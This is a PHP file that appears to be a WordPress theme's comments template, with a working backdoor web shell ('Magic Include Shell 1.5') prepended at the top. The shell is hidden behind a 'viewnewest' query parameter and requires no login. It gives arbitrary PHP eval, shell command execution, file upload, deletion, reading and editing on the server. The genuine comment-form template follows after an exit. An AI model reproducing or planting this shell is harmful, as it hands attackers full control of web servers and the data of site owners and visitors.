<?php
$ver='1.5';
if(isset($_GET[viewnewest]))
{
$site=$PHP_SELF;
header("Content-type: text/html");
$dira=$_GET['dira'];
(empty($dira) || !isset($dira)) ? $dira='./' : '';
if(!ereg("/$",$dira)) $dira=$dira.'/';
$comanda=$_POST['comanda'];
$shcom=$_POST['shcom'];

if(isset($_POST['filee']) && !empty($_POST['filee']))
$filee=$_POST['filee'];
elseif(isset($_GET['filee']) && !empty($_GET['filee']))
$filee=$dira.''.$_GET['filee'];

$uploadfile=$_POST['uploadfile'];
$uploaddir=$_POST['uploaddir'];
$del=$_GET[del];

if(isset($_POST['edit']) && !empty($_POST['edit']))
$edit=$_POST['edit'];
elseif(isset($_GET['edit']) && !empty($_GET['edit']))
$edit=$_GET['edit'];

$save_edit=$_POST[save_edit];
function cutter($str,$sym,$len){
do{$serr=1;
if(strpos($str,$sym)!==false){
$serr=0;
$str1 = substr($str,0,strpos($str,$sym));
$str2 = substr($str,strpos($str,$sym)+$len,strlen($str));
$str = $str1.$str2;
}
} while($serr==0); 
return $str;
}   

$kverya=cutter($_SERVER["QUERY_STRING"],'dira=',999);
while(ereg('&&',$kverya))
{
$kverya=str_replace('&&','&',$kverya);
}

?>
<html>
<head>
<title>Magic Include Shell <?php echo $ver; ?></title>
<STYLE fprolloverstyle>A{COLOR: #00ff00;}
INPUT {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
TEXTAREA {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
</STYLE>
</head>
<SCRIPT language=Javascript><!--
var tl=new Array("Magic Include Shell ver.<?php echo $ver; ?> =) Private Edition by Mag, icq 884888");
var speed=40;
var index=0; text_pos=0;
var str_length=tl[0].length;
var contents, row;

function type_text()
{
  contents='';
  row=Math.max(0,index-20);
  while(row<index)
    contents += tl[row++] + '\r\n';
  document.forms[0].elements[0].value = contents + tl[index].substring(0,text_pos) + "_";
  if(text_pos++==str_length)
  {
    text_pos=0;
    index++;
    if(index!=tl.length)
    {
      str_length=tl[index].length;
      setTimeout("type_text()",300);
    }
  } else
    setTimeout("type_text()",speed);
 }//--></SCRIPT>
<body text=#ffffff bgColor=#000000 onload=type_text()>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
<textarea rows=1 cols=70></textarea><br/>
Php eval:<br/>
<textarea name="comanda" rows=10 cols=50></textarea><br/>
<input type="submit" value="eval"/>
</form>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
Shell command:<br/><input name="shcom"><br/>
<input type="submit" value="shell"/>
</form>
<form enctype="multipart/form-data" action="<?php print "$site?$kverya&dira=$dira"; ?>" method="post">
 <input type="hidden" name="MAX_FILE_SIZE" value="30000000" />
 File to upload:<br/><input name="uploadfile" type="file" />
<br/>Dir to upload:<br/><input name="uploaddir" value="<?php print $dira; ?>"/><br/>
 <input type="submit" value="Send File" />
</form>

<?php

if(!empty($comanda))
{
eval(trim(stripslashes($comanda)));
}
if(!empty($shcom))
{
`cd $dira`;
print '<pre>'.`$shcom`.'</pre>';
}

if(!empty($HTTP_POST_FILES['uploadfile']['name']))
{
@copy($HTTP_POST_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$HTTP_POST_FILES['uploadfile']['name']) ? print "<b>File ".$HTTP_POST_FILES['uploadfile']['name']." uploaded succesfully!</b><br/>" : print "<b>Upload error!</b><br/>";
}

if(!empty($del))
{
unlink($dira.$del);
print '<b>'.$del.' deleted succesfully!</b><br/>';
}

if(!empty($filee))
{
?>
<pre>

<?php
$massiv=file($filee);
for($ii=0;$ii<count($massiv);$ii++)
{
print htmlspecialchars($massiv[$ii]);
}

?>
</pre>
<?php
}

if(!empty($edit) && empty($save_edit))
{
?>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
<textarea name="save_edit" rows=20 cols=70>
<?php
$fss = @ fopen($edit, 'r');
print htmlspecialchars(fread($fss, filesize($edit)));
fclose($fss);
?>
</textarea><br/>
<input type="hidden" value="<?php print $edit ?>" name="edit"/>
<input type="submit" value="edit"/>

</form>
<?php

}
elseif(!empty($edit) && !empty($save_edit))
	{
	$fp=fopen($edit,"w");
	fputs($fp,stripslashes($save_edit));
	fclose($fp);
	print "<b>$edit edited succesfully!</b><br/>";
	}
print '<b>Dir='.$dira.'</b><br/>';
if(!($dp = opendir($dira))) die ("Cannot open ./");
$file_array = array(); 
while ($file = readdir ($dp))
	{
		$file_array[] =  $file;
	}

sort ($file_array);

			while (list($fileIndexValue, $file_name) = each ($file_array))
				{
				

			if(is_file($dira.''.$file_name))
				{
				echo "<a href=\"$site?$kverya&dira=$dira&filee=$file_name\">$file_name</a> (". round(filesize($dira.''.$file_name)/1024,1) . "kb)";
				if(is_writeable($dira.''.$file_name))
					{
					echo "-[<a href=\"$site?$kverya&dira=$dira&del=$file_name\">del</a>]";
					echo "<a href=\"$site?$kverya&dira=$dira&edit=$file_name\">edit</a>]";
					}
				print '<br/>';
				}
			else 
				echo "<a href=\"$site?$kverya&dira=$dira$file_name\">$file_name</a><br/>";	
				}


?>
</body>
</html>
<?php exit; }?>

<?php if ( !empty($post->post_password) && $_COOKIE['wp-postpass_' . COOKIEHASH] != $post->post_password) : ?>
<p><?php _e('Enter your password to view comments.'); ?></p>
<?php return; endif; ?>

<h2 id="comments"><?php comments_number(__('No Comments'), __('1 Comment'), __('% Comments')); ?>
<?php if ( comments_open() ) : ?>
	<a href="#postcomment" title="<?php _e("Leave a comment"); ?>">&raquo;</a>
<?php endif; ?>
</h2>

<?php if ( $comments ) : ?>
<ol id="commentlist">

<?php foreach ($comments as $comment) : ?>
	<li id="comment-<?php comment_ID() ?>">
	<span class="comments"><?php comment_text() ?></span>
	<p class="comments"><cite><?php comment_type(__('Comment'), __('Trackback'), __('Pingback')); ?> <?php _e('by'); ?> <?php comment_author_link() ?> &#8212; <?php comment_date() ?> @ <a href="#comment-<?php comment_ID() ?>"><?php comment_time() ?></a></cite> <?php edit_comment_link(__("Edit This"), ' |'); ?></p>
	</li>

<?php endforeach; ?>

</ol>

<?php else : // If there are no comments yet ?>
	<p class="comments"><?php _e('No comments yet.'); ?></p>
<?php endif; ?>

<p class="comments"><?php comments_rss_link(__('<abbr title="Really Simple Syndication">RSS</abbr> feed for comments on this post.')); ?>
<?php if ( pings_open() ) : ?>
	<a href="<?php trackback_url() ?>" rel="trackback"><?php _e('TrackBack <abbr title="Universal Resource Locator">URL</abbr>'); ?></a>
<?php endif; ?>
</p>

<?php if ( comments_open() ) : ?>
<h2 id="postcomment"><?php _e('Leave a comment'); ?></h2>

<?php if ( get_option('comment_registration') && !$user_ID ) : ?>
<p class="comments">You must be <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?redirect_to=<?php the_permalink(); ?>">logged in</a> to post a comment.</p>
<?php else : ?>

<form action="<?php echo get_option('siteurl'); ?>/wp-comments-post.php" method="post" id="commentform">

<?php if ( $user_ID ) : ?>

<p class="comments">Logged in as <a href="<?php echo get_option('siteurl'); ?>/wp-admin/profile.php"><?php echo $user_identity; ?></a>. <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?action=logout" title="<?php _e('Log out of this account') ?>">Logout &raquo;</a></p>

<?php else : ?>

<p class="comments"><input type="text" name="author" id="author" value="<?php echo $comment_author; ?>" size="22" tabindex="1" />
<label for="author"><small>Name <?php if ($req) _e('(required)'); ?></small></label></p>

<p class="comments"><input type="text" name="email" id="email" value="<?php echo $comment_author_email; ?>" size="22" tabindex="2" />
<label for="email"><small>Mail (will not be published) <?php if ($req) _e('(required)'); ?></small></label></p>

<p class="comments"><input type="text" name="url" id="url" value="<?php echo $comment_author_url; ?>" size="22" tabindex="3" />
<label for="url"><small>Website</small></label></p>

<?php endif; ?>

<!--<p><small><strong>XHTML:</strong> You can use these tags: <?php echo allowed_tags(); ?></small></p>-->

<p class="comments"><textarea name="comment" id="comment" cols="57%" rows="10" tabindex="4"></textarea></p>

<p class="comments"><input name="submit" type="submit" id="submit" tabindex="5" value="Submit Comment" />
<input type="hidden" name="comment_post_ID" value="<?php echo $id; ?>" />
</p>
<?php do_action('comment_form', $post->ID); ?>

</form>

<?php endif; // If registration required and not logged in ?>

<?php else : // Comments are closed ?>
<p class="comments"><?php _e('Sorry, the comment form is closed at this time.'); ?></p>
<?php endif; ?>
